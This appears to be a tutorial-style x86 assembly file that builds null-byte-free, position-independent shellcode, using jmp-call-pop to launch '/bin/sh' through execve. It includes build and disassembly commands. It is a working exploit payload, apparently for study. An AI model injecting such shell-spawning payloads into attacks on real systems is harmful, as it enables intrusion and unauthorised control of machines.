
; execve3.asm - execute "/bin/sh" and exit if you fail
; Uses relative addressing rather than absolute addresses
; Don't use opcodes that end up having null bytes in them

SECTION .text				; Code section
	global _start           ; Make label available to linker 

_start:                     ; Standard ld entry point
	jmp short callback		; Jump to the end to get our current address

dowork:
	pop     esi             ; esi now holds the address of "/bin/sh"

	xor     edx,edx         ; edx = 0 (it's also param #3 - NULL)
	push    edx             ; args[1] - NULL
	push    esi             ; args[0] - "/bin/sh"

	mov     ecx,esp         ; Param #2 - address of args array
	mov     ebx,esi         ; Param #1 - "/bin/sh"
	xor     eax,eax         ; eax = 0
	mov     al,0xb          ; System call number for execve
	int     0x80            ; Interrupt 80 hex - invoke system call

	xor     ebx,ebx		    ; Exit code, 0 = normal
	xor     eax,eax         ; eax = 0
	inc     eax             ; System call number for exit (1)
	int     0x80            ; Interrupt 80 hex - invoke system call

callback:
	call    dowork          ; Pushes the address of "/bin/sh" onto the stack
	db "/bin/sh",0          ; The program we want to run - "/bin/sh"

; $ nasm -f elf execve3.asm  
; $ ld -o execve3 execve3.o   
; $ objdump -d execve3

